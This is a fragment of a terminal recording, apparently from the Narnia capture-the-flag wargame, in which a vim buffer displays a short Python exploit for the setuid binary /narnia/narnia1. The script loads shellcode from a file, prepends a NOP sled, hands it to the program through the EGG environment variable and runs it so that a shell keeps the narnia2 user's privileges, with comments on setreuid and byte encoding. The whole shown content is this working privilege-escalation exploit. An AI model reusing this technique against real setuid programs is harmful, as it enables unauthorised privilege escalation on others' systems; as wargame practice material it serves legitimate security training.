[26.392157, "o", "\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[3;1H\u001bPzz\u001b\\\u001b[0%m\u001b[6n\u001b[3;1H           \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007\u001b[1;1H\u001b[35mimport\u001b[m os\r\r\nsc = \u001b[36mopen\u001b[m(\u001b[31m\"/tmp/l1.bin\"\u001b[m, \u001b[31m\"rb\"\u001b[m).read()\u001b[2;38H\u001b[K\u001b[3;1H\u001b[34m# narnia1 calls getenv(\"EGG\") as code: euid is narnia2 (setuid binary), so the\u001b[m\u001b[3;79H\u001b[K\u001b[4;1H\u001b[34m# shellcode must setreuid(euid, euid) before execve or the shell drops to narnia1.\r\r\n# env must be passed as a BYTES dict: os.environ UTF-8 would turn \\x90 into \\xc2\\x90.\u001b[m\r\r\n\u001b[33massert\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m sc\r\r\nenv = {\u001b[31mb\"EGG\"\u001b[m: \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m200\u001b[m + sc, \u001b[31mb\"PATH\"\u001b[m: \u001b[31mb\"/usr/bin:/bin\"\u001b[m}\r\r\nos.execve(\u001b[31mb\"/narnia/narnia1\"\u001b[m, [\u001b[31mb\"/narnia/narnia1\"\u001b[m], env)\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                       